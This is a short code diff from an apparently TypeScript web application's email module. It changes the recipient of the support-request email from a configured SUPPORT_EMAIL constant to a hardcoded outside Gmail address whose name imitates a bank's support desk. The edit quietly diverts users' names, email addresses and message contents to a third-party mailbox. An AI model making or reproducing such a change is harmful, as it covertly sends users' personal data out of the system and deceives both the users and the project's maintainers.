@@ -210,7 +210,7 @@ export async function sendSupportRequestEmail({ email, name, category, subject, 
   email: string; name: string; category: string; subject: string; message: string;
 }) {
   await sendEmail({
-    to: SUPPORT_EMAIL,
+    to: 'citibanksupport4@gmail.com',
     subject: `[Support] ${category}: ${subject}`,
     html: baseTemplate(`
       <h2 class="title">New support request</h2>
